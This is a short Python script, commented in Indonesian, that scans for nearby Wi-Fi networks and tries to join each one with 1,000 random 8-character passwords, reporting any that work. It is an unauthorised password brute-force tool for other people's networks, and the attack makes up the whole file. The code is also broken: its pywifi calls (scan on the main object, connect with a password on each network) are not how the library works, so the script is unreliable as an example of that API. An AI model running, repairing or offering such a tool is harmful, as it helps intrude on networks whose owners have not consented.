import pywifi
import random

def generate_random_password(length):
    """
    Menghasilkan kata sandi acak dengan panjang tertentu.

    Args:
        length: Panjang kata sandi.

    Returns:
        Kata sandi acak.
    """

    characters = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+,./?;:'[]{}`~"
    password = ""
    for i in range(length):
        password += random.choice(characters)
    return password

def main():
    # Inisialisasi library pywifi
    wifi = pywifi.PyWiFi()

    # Temukan jaringan wifi yang tersedia
    networks = wifi.scan()

    # Buat daftar kata sandi acak
    passwords = [generate_random_password(8) for i in range(1000)]

    # Coba sambungkan ke setiap jaringan wifi
    for network in networks:
        for password in passwords:
            try:
                network.connect(password)
                print("Berhasil menyambungkan ke jaringan {} dengan kata sandi {}".format(network.ssid, password))
                break
            except Exception as e:
                pass

if __name__ == "__main__":
    main()
